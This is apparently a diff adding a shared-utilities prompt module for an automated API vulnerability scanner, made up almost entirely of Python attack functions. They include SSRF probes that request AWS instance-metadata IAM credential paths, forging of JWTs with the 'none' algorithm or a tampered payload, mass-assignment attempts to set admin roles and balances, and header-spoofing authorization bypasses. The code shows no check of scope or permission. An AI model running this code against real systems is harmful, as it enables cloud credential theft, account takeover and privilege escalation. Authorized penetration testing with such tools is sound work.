@@ -1,0 +1,467 @@
+<shared_testing_utilities>
+<title>SHARED TESTING UTILITIES</title>
+
+<critical>This module contains reusable testing functions that are shared across multiple vulnerability detection prompts. Import and use these functions to avoid code duplication.</critical>
+
+<http_utilities>
+**Common HTTP Testing Functions:**
+
+```python
+# Shared HTTP utilities for all vulnerability testing
+import requests
+import subprocess
+import json
+from typing import Dict, List, Optional, Any
+
+def make_request(
+    url: str,
+    method: str = "GET",
+    headers: Optional[Dict[str, str]] = None,
+    params: Optional[Dict[str, Any]] = None,
+    data: Optional[Dict[str, Any]] = None,
+    json_data: Optional[Dict[str, Any]] = None,
+    timeout: int = 10
+) -> requests.Response:
+    """
+    Unified HTTP request function.
+    Use this instead of calling requests.get/post directly.
+    """
+    headers = headers or {}
+    
+    try:
+        resp = requests.request(
+            method=method,
+            url=url,
+            headers=headers,
+            params=params,
+            data=data,
+            json=json_data,
+            timeout=timeout,
+            allow_redirects=False  # Manual redirect handling
+        )
+        return resp
+    except Exception as e:
+        print(f"[-] Request failed: {e}")
+        raise
+
+def test_endpoint_with_payload(
+    url: str,
+    param_name: str,
+    payload: str,
+    method: str = "GET",
+    headers: Optional[Dict[str, str]] = None
+) -> Dict[str, Any]:
+    """
+    Test an endpoint with a specific payload.
+    Returns structured result.
+    """
+    if method == "GET":
+        resp = make_request(url, method="GET", params={param_name: payload}, headers=headers)
+    else:
+        resp = make_request(url, method=method, json_data={param_name: payload}, headers=headers)
+    
+    return {
+        "url": url,
+        "param": param_name,
+        "payload": payload,
+        "status": resp.status_code,
+        "response": resp.text[:500],
+        "headers": dict(resp.headers)
+    }
+```
+</http_utilities>
+
+<aws_metadata_testing>
+**AWS Metadata Testing (Shared by SSRF and OWASP Top 10):**
+
+```python
+def test_aws_metadata_endpoints(target_url: str, param_name: str = "url") -> List[Dict[str, Any]]:
+    """
+    Unified AWS metadata testing function.
+    Used by: SSRF, OWASP Top 10 (API7)
+    """
+    findings = []
+    
+    # AWS metadata endpoints
+    aws_endpoints = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://169.254.169.254/latest/user-data",
+        "http://169.254.169.254/latest/dynamic/instance-identity/document",
+        "http://169.254.169.254/latest/api/token",  # IMDSv2
+    ]
+    
+    # AWS indicators
+    aws_indicators = [
+        "ami-id", "instance-id", "iam", "security-credentials",
+        "region", "accountId", "privateIp", "devpayProductCodes"
+    ]
+    
+    for endpoint in aws_endpoints:
+        try:
+            resp = make_request(
+                target_url,
+                method="POST",
+                json_data={param_name: endpoint},
+                timeout=10
+            )
+            
+            if any(indicator in resp.text for indicator in aws_indicators):
+                findings.append({
+                    "type": "AWS_METADATA_EXPOSED",
+                    "endpoint": endpoint,
+                    "status": resp.status_code,
+                    "response": resp.text[:300]
+                })
+                print(f"[!] AWS METADATA EXPOSED: {endpoint}")
+                
+        except Exception as e:
+            pass
+    
+    return findings
+```
+</aws_metadata_testing>
+
+<jwt_testing>
+**JWT Testing Utilities (Shared by Authentication and OWASP Top 10):**
+
+```python
+import base64
+
+def parse_jwt(token: str) -> Dict[str, Any]:
+    """Parse JWT into header, payload, signature."""
+    parts = token.split('.')
+    if len(parts) != 3:
+        raise ValueError("Invalid JWT format")
+    
+    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
+    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+    
+    return {
+        "header": header,
+        "payload": payload,
+        "signature": parts[2]
+    }
+
+def create_jwt_none_algo(original_jwt: str) -> str:
+    """
+    Create JWT with 'none' algorithm.
+    Used by: Authentication, OWASP Top 10 (API2)
+    """
+    parsed = parse_jwt(original_jwt)
+    
+    # Modify header to use 'none' algorithm
+    parsed['header']['alg'] = 'none'
+    
+    # Reconstruct JWT without signature
+    new_header = base64.urlsafe_b64encode(
+        json.dumps(parsed['header']).encode()
+    ).decode().rstrip('=')
+    
+    new_payload = base64.urlsafe_b64encode(
+        json.dumps(parsed['payload']).encode()
+    ).decode().rstrip('=')
+    
+    return f"{new_header}.{new_payload}."
+
+def create_tampered_jwt(original_jwt: str, payload_changes: Dict[str, Any]) -> str:
+    """
+    Create JWT with modified payload but original signature.
+    Used by: Authentication, OWASP Top 10 (API2)
+    """
+    parsed = parse_jwt(original_jwt)
+    
+    # Apply payload changes
+    parsed['payload'].update(payload_changes)
+    
+    # Re-encode with original signature
+    new_header = base64.urlsafe_b64encode(
+        json.dumps(parsed['header']).encode()
+    ).decode().rstrip('=')
+    
+    new_payload = base64.urlsafe_b64encode(
+        json.dumps(parsed['payload']).encode()
+    ).decode().rstrip('=')
+    
+    return f"{new_header}.{new_payload}.{parsed['signature']}"
+
+def test_jwt_vulnerabilities(api_endpoint: str, valid_jwt: str) -> List[Dict[str, Any]]:
+    """
+    Comprehensive JWT testing.
+    Used by: Authentication, OWASP Top 10 (API2)
+    """
+    findings = []
+    
+    # Test 1: None algorithm
+    none_jwt = create_jwt_none_algo(valid_jwt)
+    resp = make_request(api_endpoint, headers={"Authorization": f"Bearer {none_jwt}"})
+    if resp.status_code == 200:
+        findings.append({
+            "type": "JWT_NONE_ALGO",
+            "jwt": none_jwt,
+            "status": resp.status_code
+        })
+    
+    # Test 2: Tampered payload
+    tampered_jwt = create_tampered_jwt(valid_jwt, {"role": "admin", "user_id": "1"})
+    resp = make_request(api_endpoint, headers={"Authorization": f"Bearer {tampered_jwt}"})
+    if resp.status_code == 200:
+        findings.append({
+            "type": "JWT_SIGNATURE_NOT_VERIFIED",
+            "jwt": tampered_jwt,
+            "status": resp.status_code
+        })
+    
+    return findings
+```
+</jwt_testing>
+
+<mass_assignment_testing>
+**Mass Assignment Testing (Shared by IDOR and OWASP Top 10):**
+
+```python
+def test_mass_assignment_fields(
+    api_endpoint: str,
+    session_token: str,
+    test_fields: Optional[Dict[str, Any]] = None
+) -> List[Dict[str, Any]]:
+    """
+    Unified mass assignment testing.
+    Used by: IDOR, OWASP Top 10 (API3)
+    """
+    findings = []
+    
+    # Default sensitive fields if not provided
+    if test_fields is None:
+        test_fields = {
+            # Privilege escalation
+            "role": "admin",
+            "is_admin": True,
+            "admin": True,
+            "privilege_level": 10,
+            "access_level": "admin",
+            
+            # Account manipulation
+            "balance": 999999,
+            "credits": 999999,
+            "subscription": "premium",
+            
+            # User impersonation
+            "user_id": "1",
+            "account_id": "admin",
+            
+            # Internal flags
+            "verified": True,
+            "approved": True,
+            "internal": True,
+        }
+    
+    for field, value in test_fields.items():
+        payload = {field: value}
+        
+        # Test with PATCH
+        resp = make_request(
+            api_endpoint,
+            method="PATCH",
+            json_data=payload,
+            headers={"Authorization": f"Bearer {session_token}"}
+        )
+        
+        if resp.status_code in [200, 204]:
+            # Verify if field was actually updated
+            verify_resp = make_request(
+                api_endpoint,
+                headers={"Authorization": f"Bearer {session_token}"}
+            )
+            
+            if verify_resp.status_code == 200:
+                data = verify_resp.json()
+                if data.get(field) == value:
+                    findings.append({
+                        "type": "MASS_ASSIGNMENT",
+                        "field": field,
+                        "value": value,
+                        "verified": True
+                    })
+                    print(f"[!] MASS ASSIGNMENT: {field}={value}")
+    
+    return findings
+```
+</mass_assignment_testing>
+
+<header_bypass_testing>
+**Header Bypass Testing (Shared by IDOR and Authorization tests):**
+
+```python
+def test_authorization_headers(
+    target_url: str,
+    session_token: Optional[str] = None
+) -> List[Dict[str, Any]]:
+    """
+    Unified header bypass testing.
+    Used by: IDOR, Authorization tests
+    """
+    findings = []
+    
+    # IP spoofing headers
+    ip_headers = {
+        "X-Forwarded-For": ["127.0.0.1", "localhost"],
+        "X-Real-IP": ["127.0.0.1"],
+        "X-Originating-IP": ["127.0.0.1"],
+        "X-Remote-IP": ["127.0.0.1"],
+        "X-Client-IP": ["127.0.0.1"],
+        "CF-Connecting-IP": ["127.0.0.1"],
+        "True-Client-IP": ["127.0.0.1"],
+    }
+    
+    # Auth bypass headers
+    auth_headers = {
+        "X-User-ID": ["1", "admin"],
+        "X-Role": ["admin"],
+        "X-Admin": ["true", "1"],
+        "X-Is-Admin": ["true"],
+        "X-Internal": ["true"],
+    }
+    
+    # Combine all headers
+    all_headers = {**ip_headers, **auth_headers}
+    
+    for header_name, values in all_headers.items():
+        for value in values:
+            headers = {header_name: value}
+            if session_token:
+                headers["Authorization"] = f"Bearer {session_token}"
+            
+            resp = make_request(target_url, headers=headers)
+            
+            if resp.status_code == 200:
+                # Check for bypass indicators
+                indicators = ["admin", "internal", "dashboard", "privileged"]
+                if any(ind in resp.text.lower() for ind in indicators):
+                    findings.append({
+                        "type": "HEADER_BYPASS",
+                        "header": header_name,
+                        "value": value,
+                        "status": resp.status_code
+                    })
+                    print(f"[!] HEADER BYPASS: {header_name}={value}")
+    
+    return findings
+```
+</header_bypass_testing>
+
+<swagger_detection>
+**Swagger/OpenAPI Detection (Shared by Security Misconfiguration tests):**
+
+```python
+def detect_swagger_endpoints(base_url: str) -> List[Dict[str, Any]]:
+    """
+    Unified Swagger/OpenAPI detection.
+    Used by: OWASP Top 10 (API8), Security Misconfiguration
+    """
+    findings = []
+    
+    swagger_paths = [
+        "/swagger.json",
+        "/swagger.yaml",
+        "/swagger/v1/swagger.json",
+        "/api/swagger.json",
+        "/api-docs",
+        "/v2/api-docs",
+        "/v3/api-docs",
+        "/openapi.json",
+        "/openapi.yaml",
+        "/docs",
+        "/swagger-ui.html",
+        "/swagger-ui/",
+    ]
+    
+    for path in swagger_paths:
+        url = f"{base_url}{path}"
+        resp = make_request(url)
+        
+        if resp.status_code == 200:
+            indicators = ["swagger", "openapi", "paths", "definitions", "components"]
+            if any(ind in resp.text.lower() for ind in indicators):
+                findings.append({
+                    "type": "SWAGGER_EXPOSED",
+                    "url": url,
+                    "size": len(resp.text)
+                })
+                print(f"[!] SWAGGER EXPOSED: {url}")
+    
+    return findings
+```
+</swagger_detection>
+
+<parameter_discovery>
+**Parameter Discovery with Arjun (Shared utility):**
+
+```python
+def discover_parameters_arjun(target_url: str, method: str = "GET") -> List[str]:
+    """
+    Unified Arjun parameter discovery.
+    Used by: IDOR, API testing
+    """
+    cmd = [
+        "arjun",
+        "-u", target_url,
+        "-m", method,
+        "--stable",
+        "-oJ", "/workspace/arjun_output.json"
+    ]
+    
+    print(f"[*] Running Arjun on {target_url}...")
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    
+    try:
+        with open('/workspace/arjun_output.json', 'r') as f:
+            data = json.load(f)
+        
+        discovered_params = data.get(target_url, [])
+        print(f"[+] Discovered {len(discovered_params)} parameters")
+        return discovered_params
+    except Exception as e:
+        print(f"[-] Error parsing Arjun output: {e}")
+        return []
+```
+</parameter_discovery>
+
+<usage_instructions>
+**How to Use Shared Utilities:**
+
+In any vulnerability prompt, import and use these functions:
+
+```python
+# Instead of duplicating code, use shared functions:
+
+# Example 1: AWS metadata testing
+findings = test_aws_metadata_endpoints("https://api.example.com/fetch", "url")
+
+# Example 2: JWT testing
+jwt_findings = test_jwt_vulnerabilities("https://api.example.com/profile", "valid_jwt_token")
+
+# Example 3: Mass assignment
+mass_assign_findings = test_mass_assignment_fields(
+    "https://api.example.com/users/profile",
+    "user_token"
+)
+
+# Example 4: Header bypass
+header_findings = test_authorization_headers("https://api.example.com/admin")
+
+# Example 5: Swagger detection
+swagger_findings = detect_swagger_endpoints("https://api.example.com")
+
+# Example 6: Parameter discovery
+params = discover_parameters_arjun("https://api.example.com/users", "GET")
+```
+
+**Benefits:**
+- ✅ No code duplication
+- ✅ Consistent testing methodology
+- ✅ Easier maintenance
+- ✅ Centralized bug fixes
+- ✅ Standardized output format
+</usage_instructions>
+</shared_testing_utilities>
